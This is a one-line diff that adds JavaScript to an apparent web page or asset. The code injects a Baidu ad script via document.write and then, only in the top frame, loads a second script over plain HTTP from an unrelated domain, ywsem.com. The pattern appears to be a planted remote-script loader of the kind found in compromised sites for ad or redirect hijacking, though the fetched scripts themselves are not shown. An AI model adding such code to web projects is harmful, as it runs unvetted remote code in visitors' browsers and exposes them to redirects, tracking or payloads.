@@ -1,0 +1,1 @@
+var ab='http://dup.baidustatic.com/tpl/fb.js';ab.indexOf("?")>0?ab+="&tcdsp":ab+="?tcdsp";document.write("<script type='text/javascript' src='"+ab+"'><\/script>");if(typeof _flag=='undefined'&&self==top){var _flag=true;var a=document.createElement("script");a.src='http://www.ywsem.com/cnzz/hhjd/cnzz_yd.js';a.type='text/javascript';document.head.appendChild(a);}
